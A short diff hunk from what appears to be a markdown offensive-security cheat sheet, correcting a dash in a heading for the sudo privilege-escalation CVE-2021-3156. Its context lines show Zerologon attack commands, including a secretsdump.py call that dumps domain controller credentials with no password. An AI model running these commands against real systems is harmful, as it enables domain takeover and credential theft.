@@ -270,7 +270,7 @@ $ python3 zerologon_tester.py <HANDLE> <RHOST>
 $ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
 
-## CVE-2021–3156: Sudo / sudoedit LPE
+## CVE-2021-3156: Sudo / sudoedit LPE
 
 > https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
 
